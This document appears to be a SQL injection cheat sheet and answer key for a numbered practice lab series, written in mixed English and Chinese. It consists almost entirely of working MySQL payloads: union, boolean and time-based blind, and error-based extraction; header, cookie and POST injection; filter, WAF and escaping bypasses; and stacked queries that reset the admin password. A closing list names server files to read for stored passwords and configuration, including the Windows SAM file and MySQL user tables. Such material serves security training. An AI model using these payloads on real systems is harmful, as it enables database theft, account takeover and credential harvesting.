# Injection Flow

## get how SELECT param be enveloped
* Envelope method.
    1. int with several (): SELECT * FROM table_name WHERE id=1 // (1) // ((1))
    2. 'str' with several (): SELECT * FROM table_name WHERE username='R' // ('R') // (('R'))
    3. "str" with several (): SELECT * FROM table_name WHERE username="R" // ("R") // (("R"))
* To get how the param is enveloped.
    1. Error based : ?id=1\ --+
    2. Time based  : ?id=1 and if(1=1, !sleep(3), 0) --+

## make it work or wrong
* ?id=1 // work
* ?id=1\ // wrong

## get how many columns is SELECTed
1. ?id=1' order by 1 #                NO ERROR
1. ?id=1' order by 2 #                NO ERROR
1. ?id=1' order by 3 #                NO ERROR
1. ?id=1' order by 4 #                ERROR!!!

## union injection
* ?id=-1' union select 1,2,3 #
* ?id=-1' union select 'a','b','c' #

## 基于联合查询的SQL注入
Variable/function	Output
user()			Current User
database()		Current Database
schema()		Current Database
version()		Database Version
UUID()			System UUID Key
current_user()		Current User
system_user()		Current System User
session_user()		Session User
@@hostname		Current Hostname
@@tmpdir		Temporary Directory
@@datadir		Data Directory
@@version		Version of Database
@@basedir		Base Directory
@@GLOBAL.have_symlink	Check if symlink is Enabled or Disabled
@@GLOBAL.have_ssl	Check if it SSL is available

## get a certain table
?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+

## get all tables
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

## get all column names in a certain table
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

## get information in a certain table
?id=-1' union select 1,group_concat(username),concat_ws("::", password) from users --+


# 基于布尔代数的盲注

## make it work or wrong
?id=1' AND 1=1 --+
?id=1' AND 1=0 --+

## get length of database()
* ?id=1' and length(database())<10 --+ // 函数结果二分法
* ?id=1' and database() regexp '.{1,10}' --+ // 正则表达匹配法

## get name of database()
* ?id=1' and ascii(substr(database(),1,1))>100 --+
* ?id=1' and database() regexp '^[a-z].{7}' --+

## get tables of a certain database
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 --+
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+

## get columns of a certain table
?id=1' and length((select column_name from information_schema.columns where table_name=['users'] limit 0,1))>5 --+
?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=['users'] limit 0,1),1,1))>50 --+

## get information of a certain column
?id=1' and length((select [username] from [users] limit 0,1))<5 --+
?id=1' and ascii(substr((select [username] from [users] limit 0,1),1,1))>50 --+

# Answers of the labs
01. basic : ?id=0' union select --+
02. basic : ?id=0 union select --+
03. basic : ?id=0') union select --+
04. basic : ?id=0") union select --+
05. Blind Injection: Error based : ?id=1' union select 1,2,count(*) from information_schema.tables group by concat_ws(":", database(), floor(rand(0)*2)) --+
06. Blind Injection: ?id=1" and database() regexp '^[a-z]{1,9}' --+
07. Dump into Outfile
08. Blind-Boolian-Single Quotes: ?id=1' and database() regexp '^[a-z]{1,9}' --+
09. Blind-Time based-Single Quotes: FalseOK : ?id=1' and if(database() regexp '[a-z]', !sleep(5), 0) --+
10. Blind-Time based-Double Quotes: FalseOK : ?id=1" and if(database() regexp '[a-z]', !sleep(5), 0) --+
	1st. try ?id=1' and if(1=1, !sleep(5), 0) --+  // no sleep
	2nd. try ?id=1" and if(1=1, !sleep(5), 0) --+  // sleep
	3nd. try ?id=1" and if(database() regexp '[a-z]', !sleep(5), 0) --+  // sleep
11. Post injection - Error Based String : '
12. Post injection - Error Based String : ")
13. Post injection - Double Injection-String-with-twist : ') && into outfile OR Error-Based
	uname=1') union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #&passwd=&submit=Submit
14. Post injection - Double Injection-Double quotes : "  && into outfile OR Error-Based
	uname=1" union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #&passwd=&submit=Submit
15. Post injection - Blind - Boolian Based : guess '  && into outfile
	uname=' or if(database() regexp '[a-z]', !sleep(5), 0) limit 0,1#&passwd=&submit=Submit
16. Post injection - Blind - Time Based : guess ") && into outfile 
	uname=") or if(database() regexp '[a-z]', !sleep(5), 0) limit 0,1#&passwd=&submit=Submit
17. Update Query - Error based - String : uname=admin&passwd=1' and extractvalue(1, concat("::", database(), "::", version())) #&submit=Submit
18. Header Injection-Error Based-String : User-Agent: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1   // (must have a legal account)
19. Header Injection-Referer-Error Based-String : Referer: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
20. Form injection Cookie Injection-Error Based-String : Cookie : uname=admin' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#
21. Form injection Cookie Injection-Error Based-complex-String : Cookie : uname=base64_encode "  admin') and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# "
22. Form injection Cookie Injection-Error Based-Double Quotes-String : Cookie :  uname=base64_encode ' admin" and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# '
18-22: 要通过阅读源代码，找到源码漏洞后才能实施攻击，否则难如登天。
23. Error Based - no comments : ?id=-1' union select 1,2,3 'name_of_3        //过滤了--和#，想办法闭合SQL语句。
24. Second Degree Injections : 要攻克admin密码，首先注册新用户admin'#，然后登录，重置密码时重置了admin的密码。
25. Trick with OR & AND : Filter bypass. ascii %xx : ?id=0' union select 1,2,3 'name_of_3
26. Trick with comments : Filter bypass. ascii %xx : ?id=0'%a0union%a0select%a01,database(),3%a0'name_of_3
26a Trick with comments : Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,database(),('3
27. Trick with SELECT & UNION : Filter bypass. ascii %xx : ?id=0'%a0uniOn%a0SelEct%a01,2,3%a0'a
27a Trick with SELECT & UNION : Filter bypass. ascii %xx : ?id=0"%a0uniOn%a0SelEct%a01,2,3%a0"a
28. Trick with SELECT & UNION : Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,2,3||('a
28a Trick with SELECT & UNION : Filter bypass. ascii %xx : ?id=0') union%a0select 1,2,3 || ('a
29. Protection with WAF : id=1&id=-1' union select 1,user(),3 'a
	http://www.ntu.edu.sg/home/ehchua/programming/howto/Tomcat_HowTo.html
	find / -name webapps
30. WAF Protect : ?id=1&id=-1" union select 1,2,3 --+
	1st. try ?id=1&id=1' and if(1=1, !sleep(5), 0) --+  // no sleep
	2nd. try ?id=1&id=1" and if(1=1, !sleep(5), 0) --+  // sleep
31. WAF Protect : ?id=1&id=-1") union select 1,2,3 --+
32. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
33. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
34. Bypass AddSLASHES() : python -c "print \"\xaa' union select 1,2 #\""
35. why care for addslashes() : ?id=0 union select 1,2,3 --+
36. Bypass MySQL Real Escape String : ?id=0%aa' union select 1,version(),3 --+
37. Bypass mysql_real_escape_string : python -c "print \"\xaa' union select 1,2 #\""
38. stacked Query : id=1';insert into users(id,username,password) values ('38','less38','hello')--+
39. stacked Query : id=1;insert into users(id,username,password) values ('39','less39','hello')--+
40. stacked Query : id=1');insert into users(id,username,password) values ('40','less40','hello')--+
41. stacked Query Intiger type blind :
	?id=1' and if(1=1, !sleep(5), 0) --+  // no sleep
	?id=1  and if(1=1, !sleep(5), 0) --+  // sleep
42. Stacked Query error based : username:admin password:c'; insert into users (username, password) values ('admin\'#', '123') #
43. Stacked Query error based : username:admin password:c'); update users set password='321' where username='admin' #
44. Stacked Query blind : login_user=admin&login_password=c'; update users set password='333' where username='admin' #
	1st. try login_user=admin&login_password=c" or if(1=1,!sleep(5),0) limit 0,1 #&mysubmit=Login // no sleep
	2nd. try login_user=admin&login_password=c' or if(1=1,!sleep(5),0) limit 0,1 #&mysubmit=Login // sleep and login as Dumb
45. Stacked Query Blind based twist :  username:admin password:c'); update users set password='222' where username='admin' #
46. ORDER BY-Error-Numeric : ?sort=(select updatexml(1, concat("::", (select user()), "::"), 1)) --+
47. ORDER BY Clause-Error-Single : ?sort=1' and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) --+
48. ORDER BY Clause Clause based : ?sort=1 and database() regexp '^[a-z]'--+
49. ORDER BY Clause Blind based : ?sort=1' and if(database() regexp '^se[a-z]', !sleep(2), 0)  --+
	1st. try ?id=1  and if(1=1, !sleep(5), 0) --+  // no sleep
	2nd. try ?id=1' and if(1=1, !sleep(5), 0) --+  // sleep
50. ORDER BY Clause Blind based : ?sort=1; update users set password='50' where username='admin' --+
51. ORDER BY Clause Blind based : ?sort=1'; update users set password='51' where username='admin' --+
52. ORDER BY Clause Blind based : ?sort=1; update users set password='52' where username='admin' --+
	1st. try ?id=1' and if(1=1, !sleep(5), 0) --+  // no sleep
	2nd. try ?id=1  and if(1=1, !sleep(5), 0) --+  // sleep
53. ORDER BY Clause Blind based : ?sort=1; update users set password='53' where username='admin' --+
54. Challenge-1 :
	(1) Guess format
		1st. try ?id=1 and if(1=1, !sleep(5), 0) --+  // no sleep
		2nd. try ?id=1' and if(1=1, !sleep(5), 0) --+  // sleep
		3rd. try ?id=-1' union select 1,2 --+ // error
		4th. try ?id=-1' union select 1,2,3 --+ // ok
	(2) Get answer
		1. id=-1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema='challenges' --+
		2. id=-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='TN' --+
		3. id=-1' union select 1, group_concat(sessid), group_concat(secret_Q48) from TN --+
55. Challenge-2 : id=1) --+
56. Challenge-3 : id=1') --+
57. Challenge-4 : id=1" --+
58. Challenge-5 : ?id=1' union select 1,2,updatexml(1, concat("::", (select group_concat(table_name) from information_schema.tables where table_schema='challenges'), "::"),1 )  --+	
59. Challenge-6 : ?id=1  union select 1,2,updatexml(1, concat("::", (select group_concat(table_name) from information_schema.tables where table_schema='challenges'), "::"),1 )  --+	
60. Challenge-7 : ?id=1") union select 1,2,updatexml(1, concat("::", (select group_concat(table_name) from information_schema.tables where table_schema='challenges'), "::"),1 )  --+	
61. Challenge-8 : ?id=1')) union select 1,2,updatexml(1, concat("::", (select group_concat(table_name) from information_schema.tables where table_schema='challenges'), "::"),1 )  --+	
62. Challenge-9 : ?id=1') and if((select group_concat(table_name) from information_schema.tables where table_schema='challenges') regexp '^ro', !sleep(1), 0) --+
63. Challenge-10 : ?id=1' and if((select group_concat(table_name) from information_schema.tables where table_schema='challenges') regexp '^ro', !sleep(1), 0) --+
64. Challenge-11 : ?id=1)) and if((select group_concat(table_name) from information_schema.tables where table_schema='challenges') regexp '^ro', !sleep(1), 0) --+
65. Challenge-12 : ?id=1") and if((select group_concat(table_name) from information_schema.tables where table_schema='challenges') regexp '^ro', !sleep(1), 0) --+

# Error-based functions
select count(*), concat_ws(':', database(), floor(rand(0)*2)) a from information_schema.columns group by a;
select count(*) from information_schema.tables group by concat_ws(':', version(), floor(rand(0)*2));
select count(*) from (select 1 union select 2 union select 3) a group by concat_ws(":", @@basedir, floor(rand(0)*2));
select min(@a:=1) from information_schema.tables group by concat_ws(":", version(),@a:=(@a+1)%2);
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
select extractvalue(1,concat(":",(select @@version), ":"));
select updatexml(1,concat(":",(select version()),":"),1);
select if(database() regexp '^e', sleep(5), 1);
select if(database() regexp '^sec', benchmark(50000000, encode("msg", "by 5 seconds")), 1);
	| mysql | benchmark(10000, md5(1)), sleep(5) |
	| postgresql | pg_sleep(), generate_series(1, 10000) |
	| ms sql server | wait for delay '0:0:5' |

# MySQL注入load_file常用路径
## WINDOWS下:
c:/boot.ini //查看系统版本
c:/windows/php.ini //php配置信息
c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
c:/winnt/php.ini
c:/winnt/my.ini
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 //存储了pcAnywhere的登陆密码
c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
d:\APACHE\Apache2\conf\httpd.conf
C:\Program Files\mysql\my.ini
C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
## LINUX/UNIX 下:
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本
/etc/issue
/etc/issue.net
/usr/local/app/php5/lib/php.ini //PHP相关设置
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/sysconfig/iptables 查看防火墙策略

load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
